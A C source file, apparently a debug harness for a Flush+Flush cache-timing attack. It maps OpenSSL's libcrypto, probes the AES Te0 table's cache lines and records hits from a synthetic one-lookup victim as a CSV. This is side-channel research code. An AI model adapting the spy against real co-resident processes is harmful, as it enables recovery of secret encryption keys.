// aes_ff_spy.c
// Debug version: Flush+Flush on OpenSSL Te0 with a synthetic one-lookup victim
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sched.h>
#include <dlfcn.h>
#include <string.h>
#include <x86intrin.h>
#include <openssl/aes.h>

// Path to libcrypto, adjust as needed
#define LIBCRYPTO_PATH "./openssl/libcrypto.so"

// Te0 file offset (from objdump / readelf)
#define AES_TTABLE_OFFSET   0x00237d40   // Te0 in .rodata

// Region size to scan around Te0
#define PROBE_REGION_SIZE   1024   // 16 cache lines of 64 bytes
//#define PROBE_REGION_SIZE   512   // 16 cache lines of 64 bytes




// Number of repetitions per (probe line, plaintext byte) pair
#define NUMBER_OF_ENCRYPTIONS  10000

// ----------------------------------------------------------------------
// Pin to core (so timing noise is smaller)
// ----------------------------------------------------------------------
static void pin_to_core(int core) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

// Fence + RDTSCP
static inline uint64_t rdtscp_barrier(void) {
    unsigned aux;
    _mm_mfence();
    uint64_t t = __rdtscp(&aux);
    _mm_mfence();
    return t;
}

// Measure cycles taken by clflush on address p
static inline uint64_t flush_cycles(const void *p) {
    unsigned aux;
    _mm_mfence();
    uint64_t t1 = __rdtscp(&aux);
    _mm_clflush(p);
    _mm_mfence();
    uint64_t t2 = __rdtscp(&aux);
    return t2 - t1;
}

// ----------------------------------------------------------------------
// Simple calibration: estimate hit and miss and choose threshold
// ----------------------------------------------------------------------
static unsigned calibrate_threshold(unsigned *hit_mean_out,
                                    unsigned *miss_mean_out) {
    static uint8_t buf[4096];
    volatile uint8_t *target = &buf[2048];

    const int N = 20000;
    uint64_t hit_sum = 0, miss_sum = 0;
    int hit_count = 0, miss_count = 0;

    // Miss samples: flush first, then flush again
    for (int i = 0; i < N; i++) {
        _mm_clflush((const void *)target);
        uint64_t c = flush_cycles((const void *)target);
        miss_sum += c;
        miss_count++;
    }

    // Hit samples: touch, then flush
    for (int i = 0; i < N; i++) {
        (void)*target;  // bring into cache
        uint64_t c = flush_cycles((const void *)target);
        hit_sum += c;
        hit_count++;
    }

    unsigned miss_mean = (unsigned)(miss_sum / miss_count);
    unsigned hit_mean  = (unsigned)(hit_sum / hit_count);

    if (hit_mean_out)  *hit_mean_out  = hit_mean;
    if (miss_mean_out) *miss_mean_out = miss_mean;

    // Put threshold in the middle
    unsigned threshold = (hit_mean + miss_mean) / 2;
    return threshold;
}

// ----------------------------------------------------------------------
// Victim: one Te0 lookup per call
// Te0 is at base, pt0 is the plaintext first byte
// ----------------------------------------------------------------------
/*
static inline void victim_lookup(uint8_t pt0,
                                 volatile uint32_t *acc,
                                 volatile uint32_t *Te0_base) {
    // Each Te0 entry is 4 bytes, Te0[pt0] lies somewhere in the Te0 region
//rand

	uint8_t idx = pt0 + (rand() & 0x0F);
	uint32_t v = Te0_base[idx*16];


//	uint32_t v = Te0_base[pt0];
//    uint32_t v = Te0_base[pt0*16];
    
    *acc ^= v;
}
*/

static inline void victim_lookup(uint8_t pt_line,
                                 volatile uint32_t *acc,
                                 volatile uint32_t *Te0_base) {
    // one cache line = 16 entries = 64 bytes
    uint8_t idx_in_line = rand() & 0x0F;              // 0..15
    uint32_t idx = (uint32_t)(pt_line * 16u + idx_in_line);
    uint32_t v = Te0_base[idx];
    *acc ^= v;
}

int main(int argc, char **argv) {
    int core = 2;  // default core
    int samples = NUMBER_OF_ENCRYPTIONS;

    // Very simple arg parsing
    for (int i = 1; i < argc; i++) {
        if (i + 1 < argc && strcmp(argv[i], "--core") == 0) {
            core = atoi(argv[++i]);
        } else if (i + 1 < argc && strcmp(argv[i], "--samples") == 0) {
            samples = atoi(argv[++i]);
        } else {
            fprintf(stderr, "Usage: %s [--core N] [--samples N]\n", argv[0]);
            return 1;
        }
    }

    pin_to_core(core);
    printf("[spy] pinned to core %d\n", core);


    srand(0x12345678); //seed PRNG once


    // Calibrate hit vs miss threshold
    unsigned hit_mean, miss_mean;
    unsigned threshold = calibrate_threshold(&hit_mean, &miss_mean);
    printf("[spy] hit_mean=%u miss_mean=%u threshold=%u\n",
           hit_mean, miss_mean, threshold);

    // Map libcrypto
    int fd = open(LIBCRYPTO_PATH, O_RDONLY);
    if (fd < 0) {
        perror("open libcrypto");
        return 1;
    }

    off_t size = lseek(fd, 0, SEEK_END);
    if (size <= 0) {
        fprintf(stderr, "libcrypto size 0 or error\n");
        close(fd);
        return 1;
    }

    size_t map_size = (size_t)size;
    if (map_size & 0xFFF) {
        map_size = (map_size | 0xFFF) + 1;
    }

    unsigned char *lib_base = mmap(NULL, map_size, PROT_READ,
                                   MAP_SHARED, fd, 0);
    if (lib_base == MAP_FAILED) {
        perror("mmap libcrypto");
        close(fd);
        return 1;
    }
    close(fd);

    unsigned char *base = lib_base + AES_TTABLE_OFFSET;
    unsigned char *end  = base + PROBE_REGION_SIZE;

    printf("[spy] mapped %s size=%zu, Te0 region [%p, %p)\n",
           LIBCRYPTO_PATH, map_size, (void *)base, (void *)end);

    size_t num_probes = (end - base) / 64;
    if (num_probes == 0) {
        fprintf(stderr, "probe region too small\n");
        munmap(lib_base, map_size);
        return 1;
    }

    // hit_counts[pidx][pt] for pt in 0,16,...,240
    size_t **hit_counts = (size_t **)calloc(num_probes, sizeof(size_t *));
    if (!hit_counts) {
        fprintf(stderr, "calloc hit_counts failed\n");
        munmap(lib_base, map_size);
        return 1;
    }

    for (size_t i = 0; i < num_probes; i++) {
        hit_counts[i] = (size_t *)calloc(256, sizeof(size_t));
        if (!hit_counts[i]) {
            fprintf(stderr, "calloc hit_counts[%zu] failed\n", i);
            for (size_t j = 0; j < i; j++) free(hit_counts[j]);
            free(hit_counts);
            munmap(lib_base, map_size);
            return 1;
        }
    }

    volatile uint32_t *Te0 = (volatile uint32_t *)base;
    volatile uint32_t acc = 0;

    // Loop over plaintext first byte 0,16,...,240
    for (size_t pt = 0; pt < 256; pt += 16) {
        //uint8_t pt0 = (uint8_t)pt;
	uint8_t pt_line = (uint8_t)(pt / 16);   // 0..15
						//
        for (size_t pidx = 0; pidx < num_probes; pidx++) {
            unsigned char *probe = base + pidx * 64;
            size_t hits = 0;

            sched_yield();

            for (int i = 0; i < samples; i++) {
                // Flush the line
                flush_cycles(probe);

                // Victim does one T-table lookup
                //victim_lookup(pt0, &acc, Te0);

		victim_lookup(pt_line, &acc, Te0);

                // Measure Flush Flush latency
                uint64_t t_flush = flush_cycles(probe);

                if (t_flush < threshold) {
                    hits++;
                }
            }
            hit_counts[pidx][pt] = hits;
        }
    }

    // Print CSV: same format as before
    printf("probe_offset");
    for (size_t pt = 0; pt < 256; pt += 16) {
        printf(",pt_%zu", pt);
    }
    printf("\n");

    for (size_t pidx = 0; pidx < num_probes; pidx++) {
        size_t offset = pidx * 64;
        printf("0x%06zx", offset);
        for (size_t pt = 0; pt < 256; pt += 16) {
            printf(",%zu", hit_counts[pidx][pt]);
        }
        printf("\n");
    }

    for (size_t i = 0; i < num_probes; i++) {
        free(hit_counts[i]);
    }
    free(hit_counts);

    munmap(lib_base, map_size);
    fflush(stdout);
    return 0;
}

